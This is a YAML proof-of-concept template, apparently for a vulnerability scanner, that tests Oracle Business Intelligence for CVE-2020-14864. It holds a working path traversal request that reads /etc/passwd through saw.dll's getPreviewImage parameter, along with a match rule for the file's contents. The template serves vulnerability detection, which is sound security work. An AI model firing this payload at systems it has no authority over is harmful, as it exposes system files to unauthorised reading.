name: yaml-poc-oracle-business_intelligence-directory_traversal-CVE-2020-14864
binding: 11a87d02-3bc9-4b94-a4ad-bc83ff8b28c4
detail:
    author: guangyao.yang
    links:
        - http://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html
        - http://www.nsfocus.net/vulndb/50547
        - https://cxsecurity.com/issue/WLB-2020100193
        - https://nvd.nist.gov/vuln/detail/CVE-2020-14864
        - https://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html
        - https://vigilance.fr/vulnerability/Oracle-Fusion-Middleware-vulnerabilities-of-October-2020-33644
        - https://www.exploit-db.com/exploits/48964
        - https://www.oracle.com/security-alerts/cpuoct2020.html
    vulnerability:
        id: 56756d49-5f32-4982-8ef2-0893f918dbe1
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("text/plain") && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0()
